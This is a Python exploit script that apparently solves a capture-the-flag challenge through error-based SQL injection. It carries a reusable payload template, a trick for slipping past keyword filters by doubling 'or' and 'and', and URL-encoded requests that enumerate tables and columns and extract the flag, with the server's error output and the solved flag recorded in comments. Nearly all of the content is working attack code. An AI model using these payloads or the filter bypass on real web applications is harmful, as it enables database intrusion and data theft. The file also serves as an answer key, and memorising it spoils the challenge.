#!/usr/bin/env python3

"""
and (select 1 from(select
count(*),concat((select (select concat(0x27,

(select {whatever you want here}),

0x27))
from information_schema.tables limit 0,1),floor(rand(0)*2))x
from information_schema.tables group by x)a) = 1;
"""

import urllib.request


# we have some filters for 'or' and 'and'
# 'or' -> 'oorr'
# 'and' -> 'aandnd'

# select table name
qr = 'http://tor.atdog.tw:8080/error/index.php?id=1%20aandnd%20(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x27,(%20SELECT%20table_name%20FROM%20infoorrmation_schema.columns%20limit%20{},1),0x27))%20from%20infoorrmation_schema.tables%20limit%200,1),flooorr(raandnd(0)*2))x%20from%20infoorrmation_schema.tables%20group%20by%20x)a)%20=%201;'

# select colomn name
qr = 'http://tor.atdog.tw:8080/error/index.php?id=1%20aandnd%20(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x27,(%20SELECT%20column_name%20FROM%20infoorrmation_schema.columns%20limit%20{},1),0x27))%20from%20infoorrmation_schema.tables%20limit%200,1),flooorr(raandnd(0)*2))x%20from%20infoorrmation_schema.tables%20group%20by%20x)a)%20=%201;'

# select flag from ooooooooofl4gsss
qr = 'http://tor.atdog.tw:8080/error/index.php?id=1%20aandnd%20(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x27,(select%20flag%20from%20ooooooooofl4gsss%20limit%201,1),0x27))%20from%20infoorrmation_schema.tables%20limit%200,1),flooorr(raandnd(0)*2))x%20from%20infoorrmation_schema.tables%20group%20by%20x)a)%20=%201;'
ans = ''

# 480 Duplicate entry ''news'1' for key 'group_key'
# 481 Duplicate entry ''news'1' for key 'group_key'
# 482 Duplicate entry ''ooooooooofl4gsss'1' for key 'group_key'
# 483 Duplicate entry ''ooooooooofl4gsss'1' for key 'group_key'


# 480 Duplicate entry ''id'1' for key 'group_key'
# 481 Duplicate entry ''title'1' for key 'group_key'
# 482 Duplicate entry ''id'1' for key 'group_key'
# 483 Duplicate entry ''flag'1' for key 'group_key'

# 1st and 2nd
#for i in range(480, 500):
#    req = urllib.request.Request(qr.format(i))
#    req.add_header('User-Agent', 'Chrome/27.0.1453.93')
#    doc = urllib.request.urlopen(req)
#    s = doc.read()
#    print(i, s.decode())


# Duplicate entry ''SecProg{why_my_pay1oad_is_s0_Complic4tEd}'1' for key 'group_key'
req = urllib.request.Request(qr)
req.add_header('User-Agent', 'Chrome/27.0.1453.93')
doc = urllib.request.urlopen(req)
s = doc.read()
print(s.decode())



# table name = ooooooooofl4gsss
# column name = flag
#SecProg{why_my_pay1oad_is_s0_Complic4tEd}
